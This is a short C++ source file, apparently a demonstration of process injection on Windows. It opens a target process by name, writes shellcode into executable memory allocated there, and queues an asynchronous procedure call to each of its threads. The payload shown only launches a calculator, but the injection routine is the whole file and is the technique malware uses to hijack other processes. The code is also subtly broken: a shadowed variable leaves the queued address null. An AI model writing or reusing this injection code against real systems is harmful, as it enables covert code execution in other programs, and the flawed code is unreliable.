#include <Windows.h>

#include <format>
#include <string>

#include "ulib.h"

int main(int argc, char **argv)
{
  if (argc != 2) {
    ::ul::error("inject.exe <process name>");
    return EXIT_FAILURE;
  }

#if _WIN64
  constexpr uint8_t shellcode[206] = ul::shellcodes::x64::pop_calc;
#else
  constexpr uint8_t shellcode[201] = ul::shellcodes::x86::pop_calc;
#endif

  auto process_name = std::string{argv[1]};
  LPVOID shellcode_addr = nullptr;
  auto found = ::ul::walk_threads_using_toolhelp(process_name, [&](::ul::Thread const &thread) -> ::ul::walk_t {
    if (!shellcode_addr) {
      ::ul::info("Inject shellcode into target process");
      auto process_handle = ::OpenProcess(PROCESS_ALL_ACCESS, 0, thread.process.pid);
      auto shellcode_addr = ::VirtualAllocEx(process_handle, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
      WriteProcessMemory(process_handle, shellcode_addr, shellcode, sizeof(shellcode), NULL);
    }

    ::ul::info(std::format("Queue APC to target thread {}", thread.tid));
    auto thread_handle = ::OpenThread(THREAD_ALL_ACCESS, TRUE, thread.tid);
    ::QueueUserAPC((PAPCFUNC)shellcode_addr, thread_handle, NULL);
    Sleep(1000);
    return ::ul::walk_t::WALK_CONTINUE;
  });

  if (!found) {
    ::ul::error("Process not found");
    return EXIT_FAILURE;
  }

  return EXIT_SUCCESS;
}